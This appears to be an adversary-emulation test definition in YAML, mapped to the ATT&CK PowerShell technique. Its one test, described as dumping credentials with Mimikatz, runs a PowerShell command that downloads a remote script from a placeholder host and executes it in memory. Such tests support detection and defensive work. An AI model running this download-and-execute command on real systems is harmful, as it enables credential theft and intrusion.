raw_yaml:
attack_technique: T1059.001
display_name: Command and Scripting Interpreter: PowerShell
atomic_tests:
- name: Mimikatz
  description: |
    Runs Mimikatz to dump credentials
  supported_platforms: [windows]
  executor:
    command: |
      powershell.exe -Command "IEX (New-Object Net.WebClient).DownloadString('https://example.com/Invoke-Mimikatz.ps1')"
    name: command_prompt
